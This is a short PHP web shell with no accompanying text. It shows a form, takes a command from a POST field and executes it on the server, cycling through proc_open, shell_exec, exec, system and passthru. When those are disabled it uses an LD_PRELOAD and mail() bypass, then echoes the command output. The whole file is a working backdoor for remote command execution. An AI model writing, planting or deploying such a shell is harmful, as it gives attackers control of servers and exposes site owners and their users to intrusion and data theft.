<?php
function _c($c){$o='';
if(function_exists('proc_open')){$d=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];$p=proc_open($c,$d,$pp);if(is_resource($p)){$o=stream_get_contents($pp[1]).stream_get_contents($pp[2]);fclose($pp[0]);fclose($pp[1]);fclose($pp[2]);proc_close($p);if($o!='')return$o;}}
if(function_exists('shell_exec')){$o=@shell_exec($c.' 2>&1');if($o!==null&&$o!='')return$o;}
if(function_exists('exec')){@exec($c.' 2>&1',$o);$o=implode("\n",$o);if($o!='')return$o;}
if(function_exists('system')){ob_start();@system($c.' 2>&1');return ob_get_clean();}
if(function_exists('passthru')){ob_start();@passthru($c.' 2>&1');return ob_get_clean();}
if(function_exists('putenv')&&function_exists('mail')){$t=sys_get_temp_dir();$f=$t.'/o'.uniqid().'.txt';@putenv('C={'.$c.';}>'.$f.' 2>&1');@putenv('LD_PRELOAD='.$t.'/hook.so');@mail('','','');@putenv('LD_PRELOAD=');usleep(500000);if(is_file($f)){$o=@file_get_contents($f);@unlink($f);if($o!='')return$o;}}
return'[ERROR]';}
echo'<form method=post><input type=text name=c><input type=submit value=R></form>';
if(isset($_POST['c']))echo'<pre>'.htmlspecialchars(_c($_POST['c'])).'</pre>';
?>
